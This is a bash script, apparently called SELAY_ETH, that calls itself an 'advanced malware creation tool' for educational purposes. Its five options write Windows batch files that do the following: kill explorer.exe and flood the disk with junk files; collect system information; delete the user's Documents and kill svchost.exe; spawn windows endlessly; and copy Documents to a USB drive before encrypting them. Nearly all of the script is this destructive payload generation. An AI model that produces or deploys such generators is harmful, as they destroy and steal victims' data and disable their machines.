
#start

#clear_screen
clear


#variables

user=$(pwd)
dateandtime=$(date)

red='\033[0;31m'
cyan='\033[0;36m'
yellow='\033[0;33m'
white='\033[0;37m'
green='\033[0;32m'


echo -e "${green}"
echo -e                "                    ____  ____  __      _  __   __ "
echo -e                "        	   / ___|| ___ | |     / \ \ \ / /  "
echo -e                "     	           \___ \|  _| | |    / _ \ \   /  "
echo -e                "     		    ___) | |___| |___/ ___ \ | |  "
echo -e                "     		   |____/|_____|____/_/   \_\|_|  "
echo ""
echo ""

echo -e "                       ${yellow}WELCOME TO SELAY_${green}E${yellow}T${red}H${white}"
echo -e "    ${yellow}Advanced Malware creation tool(FOR EDUCATIONAL PURPOSE ONLY)"
echo -e "                         MADE BY ${cyan}B3NJI${white}         "
echo -e "${green}Usage: ./selay.sh [os(-win)] [malware_type(1-5) [filename_only]${white}"
echo -e "${green}Read "README.md" for more info.${white}"
echo "$dateandtime"
#sections
sec1=$1
sec2=$2
sec3=$3


#conditions
if [[ "$sec1" = "-win" ]] &&  [[ "$sec2" = "1" ]];
then


#crowder_malware_writer
echo "taskkill /f /im explorer.exe">output/$sec3.bat
echo "cipher /e *">>output/$sec3.bat
echo ":l">>output/$sec3.bat
echo "set a=%random%">>output/$sec3.bat
echo "echo %a%>%a%.%a%">>output/$sec3.bat
echo "goto l">>output/$sec3.bat
echo -e "${yellow}[+]Creating malware..."
sleep 2


echo -e "${cyan}[+]File $sec3 saved at $user/output/"
sleep 1

echo -e "${red}[+]WARNING : Do not test malware on your own computer!${white}"



elif [[ "$sec1" = "-win" ]] && [[ "$sec2" = "2" ]];
then

#info_gathering_malware_writer

echo "@echo off">output/$sec3.bat
echo "mkdir info_log">>output/$sec3.bat
echo "systeminfo>>info_log/sys.txt">>output/$sec3.bat
echo "echo Directory graph(tree)>>info_log/sys.txt">>output/$sec3.bat
echo "tree>>info_log/sys.txt">>output/$sec3.bat
echo "tasklist>>info_log/sys.txt">>output/$sec3.bat
echo "diskpart>>info_log/sys.txt">>output/$sec3.bat
echo "ipconfig>>info_log/sys.txt">>output/$sec3.bat
echo "logoff">>output/$sec3.bat
echo -e "${yellow}[+]Creating malware..."
sleep 2


echo -e "${cyan}[+]File $sec3 saved at $user/output"
sleep 1


echo -e "${red}[+]WARNING : Do not test malware on your own computer!${white}"


elif [[ "$sec1" =  "-win" ]] && [[ "$sec2" = "3" ]];
then

#document_deleting_malware_writer

echo "cd C:/Users/%USERNAME%/Documents">output/$sec3.bat
echo "del *">>output/$sec3.bat
echo "taskkill /f /im explorer.exe">>output/$sec3.bat
echo "taskkill /f /im svchost.exe">>output/$sec3.bat

echo -e "${yellow}[+]Creating malware..."

sleep 2

echo -e "${cyan}[+]File $sec3 saved at $user/output/"
sleep 1


echo -e "${red}[+]WARNING : Do not test malware on your own computer!${white}"


elif [[ "$sec1" = "-win" ]] && [[ "$sec2" = "4" ]];
then

#infinite_screens_malware_writer
echo "cd C:/Users/%USERNAME%/Documents">output/$sec3.bat
echo "cipher /e *">>output/$sec3.bat
echo ":l">>output/$sec3.bat
echo "start">>output/$sec3.bat
echo "goto l">>output/$sec3.bat

echo -e "${yellow}[+]Creating malware..."
sleep 2

echo -e "${cyan}[+]File $sec3 saved at $user/output/"
sleep 1

echo -e "${red}[+]WARNING : Do not test malware on your own computer!${white}"



elif [[ "$sec1" = "-win" ]] && [[ "$sec2" = "5" ]];
then

#copy_docs_to_usb_malware_writer
echo "cd C:/Users/%USERNAME%/Documents">output/$sec3.bat
echo "xcopy * J:">>output/$sec3.bat
echo "cd C:/Users/%USERNAME%/Documents">>output/$sec3.bat
echo "cipher /e *">>output/$sec3.bat
echo "logoff">>output/$sec3.bat
echo -e "${yellow}[+]Creating malware..."
sleep 2


echo -e "${cyan}[+]File $sec3 saved at $user/output/"
sleep 1

echo -e "${red}[+]WARNING : Do not test malware on your own computer!${white}"

fi



#end
